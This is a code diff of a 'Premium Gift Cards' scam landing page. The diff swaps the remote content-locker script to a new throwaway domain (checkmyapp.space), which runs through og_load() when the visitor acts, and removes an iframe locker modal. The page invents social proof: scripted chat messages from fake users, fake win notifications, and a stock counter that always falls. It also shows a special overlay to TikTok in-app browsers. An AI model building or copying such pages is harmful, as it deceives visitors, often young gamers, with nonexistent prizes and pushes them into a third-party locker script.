@@ -4,8 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Premium Gift Cards</title>
-<script type="text/javascript" id="ogjs" src="https://appchecker.space/cl/js/7jvwjk"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+<script type="text/javascript" id="ogjs" src="https://checkmyapp.space/cl/js/7jvwjk"></script>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -41,7 +42,6 @@ z-index:-3;
 100%{transform:scale(1.12) translateY(-18px);}
 }
 
-/* --- TT OVERLAY: GIF FULL SCREEN ONLY --- */
 #ttOverlay {
     position: fixed;
     inset: 0;
@@ -53,11 +53,10 @@ z-index:-3;
 #tutorialGif {
     width: 100%;
     height: 100%;
-    object-fit: cover; /* Bach i-ghatti l-ecran kamla bhal f TikTok */
+    object-fit: cover;
     pointer-events: none;
 }
 
-/* NOTIFICATION STYLE */
 #notification-toast {
     position: fixed;
     bottom: 20px;
@@ -142,7 +141,6 @@ color:#93c5fd;
 transition: all 0.4s ease;
 }
 
-/* LIVE CHAT AREA */
 .chat-container {
     max-width: 580px;
     margin: 40px auto 20px;
@@ -248,45 +246,6 @@ margin-top:16px;
 background:#1f2937;
 }
 
-#lockerModal{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.95);
-display:none;
-justify-content:center;
-align-items:center;
-z-index:9999;
-}
-
-.lockerBox{
-width:90%;
-height:85%;
-max-width:500px;
-background:#111;
-border-radius:16px;
-overflow:hidden;
-position:relative;
-}
-
-.lockerBox iframe{
-width:100%;
-height:100%;
-border:none;
-}
-
-.closeBtn{
-position:absolute;
-top:10px;
-right:10px;
-background:red;
-color:#fff;
-border:none;
-padding:8px 12px;
-border-radius:8px;
-cursor:pointer;
-font-weight:bold;
-}
-
 .footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
 
 @media(max-width:480px){
@@ -382,10 +341,10 @@ font-weight:bold;
 </div>
 </div>
 
-<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe><button class="closeBtn" onclick="closeLocker()">✕</button></div></div>
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
+// --- PAGE LOGIC (Original Messages) ---
 const giftCardMsgs = [
     "Fuck! I only got $10 card while others got $100. My luck is literally trash.",
     "Is this actually real? I've been scammed 4 times today on other sites.",
@@ -410,7 +369,6 @@ const giftCardMsgs = [
 ];
 
 const usersList = ["Alex_NY", "Sarah_LA", "Daniel.H", "Emily_99", "Mike_Gamer", "Jess_Vip", "Chris_USA", "Sophia_M", "Ryan.K", "Olivia_S", "Ava_N", "Mia_F", "Chloe_B", "David.W", "Nathan_V", "Zoe_M"];
-
 const cardsData = [
     {n: "Roblox $50", img: "https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png"},
     {n: "PlayStation $25", img: "https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg"},
@@ -418,37 +376,16 @@ const cardsData = [
     {n: "Apple $50", img: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"},
     {n: "Google Play $100", img: "https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg"}
 ];
-
 let usedMessages = [];
 let stocks = [46, 37, 61, 50, 72, 28];
 
-function getUSATime() {
-    return new Intl.DateTimeFormat('en-GB', {
-        timeZone: 'America/New_York',
-        hour: '2-digit',
-        minute: '2-digit',
-        hour12: false
-    }).format(new Date());
-}
-
+function getUSATime() { return new Intl.DateTimeFormat('en-GB', { timeZone: 'America/New_York', hour: '2-digit', minute: '2-digit', hour12: false }).format(new Date()); }
 function updateStock() {
     const idx = Math.floor(Math.random() * 6);
     const tag = document.getElementById(`stock-${idx}`);
-    if (stocks[idx] > 2) {
-        stocks[idx] -= 1;
-        tag.innerText = `Still ${stocks[idx]} Card`;
-        tag.style.background = "rgba(239, 68, 68, 0.2)";
-        tag.style.color = "#ff4d4d";
-        tag.style.transform = "scale(1.1)";
-        setTimeout(() => {
-            tag.style.background = "rgba(96,165,250,.14)";
-            tag.style.color = "#93c5fd";
-            tag.style.transform = "scale(1)";
-        }, 800);
-    }
-    setTimeout(updateStock, Math.random() * (25000 - 15000) + 15000);
+    if (stocks[idx] > 2) { stocks[idx] -= 1; tag.innerText = `Still ${stocks[idx]} Card`; }
+    setTimeout(updateStock, 15000);
 }
-
 function showNotif() {
     const toast = document.getElementById('notification-toast');
     const u = usersList[Math.floor(Math.random()*usersList.length)];
@@ -459,28 +396,17 @@ function showNotif() {
     document.getElementById('notif-time').innerText = "Today at " + getUSATime();
     toast.classList.add('show');
     setTimeout(() => { toast.classList.remove('show'); }, 4000);
-    setTimeout(showNotif, Math.random() * (15000 - 9000) + 9000);
+    setTimeout(showNotif, 12000);
 }
-
 function addChat() {
     const box = document.getElementById('chatBox');
     const u = usersList[Math.floor(Math.random()*usersList.length)];
-    
-    let availableMsgs = giftCardMsgs.filter(m => !usedMessages.includes(m));
-    if (availableMsgs.length === 0) {
-        usedMessages = [];
-        availableMsgs = giftCardMsgs;
-    }
-    
-    const m = availableMsgs[Math.floor(Math.random()*availableMsgs.length)];
-    usedMessages.push(m);
-
-    const time = getUSATime();
-    const html = `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${time}</span></div><div class="chat-text">${m}</div></div>`;
+    const m = giftCardMsgs[Math.floor(Math.random()*giftCardMsgs.length)];
+    const html = `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${getUSATime()}</span></div><div class="chat-text">${m}</div></div>`;
     box.innerHTML += html;
     box.scrollTop = box.scrollHeight;
     if(box.children.length > 10) box.removeChild(box.firstChild);
-    setTimeout(addChat, Math.random() * (12000 - 4000) + 4000);
+    setTimeout(addChat, 5000);
 }
 
 function openOffer(title,el){
@@ -497,20 +423,18 @@ function openOffer(title,el){
     },900);
 }
 
-// هاد السطر هو اللي بدلت باش يخدم السكريبت ديال الشركة نيشان
-function go(){ og_load(); }
+// التفعيل المباشر بدون Iframe
+function go(){ 
+    og_load(); 
+}
 
-function closeLocker(){ document.getElementById("lockerModal").style.display="none"; document.getElementById("lockerFrame").src=""; }
 function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
 
 window.addEventListener("load",()=>{
     showNotif();
     updateStock(); 
     for(let i=0; i<4; i++) { setTimeout(addChat, i * 1200); }
-    
-    if(/TikTok|musical_ly/i.test(navigator.userAgent)) {
-        document.getElementById("ttOverlay").style.display="block";
-    }
+    if(/TikTok|musical_ly/i.test(navigator.userAgent)) { document.getElementById("ttOverlay").style.display="block"; }
 });
 </script>
 </body>
